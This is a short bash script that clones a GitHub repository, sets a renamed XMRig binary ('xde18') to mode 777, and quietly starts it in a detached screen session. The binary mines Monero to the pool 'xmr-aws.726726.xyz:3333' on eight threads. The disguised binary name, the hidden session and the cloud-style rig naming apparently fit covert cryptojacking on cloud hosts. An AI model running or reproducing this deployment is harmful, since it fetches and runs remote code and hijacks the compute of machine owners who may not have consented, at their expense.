#!/bin/bash
git clone https://github.com/yuqingkj/xmrig_debain.git
cd /home/yuqing/xmrig_debain
chmod 777 ./xde18
screen_name=$"xmr"
screen -dmS $screen_name
cmd=$"./xde18 -o xmr-aws.726726.xyz:3333 --rig-id az -t 8";
screen -x -S $screen_name -p 0 -X stuff "$cmd"
screen -x -S $screen_name -p 0 -X stuff $'\n'
echo ok
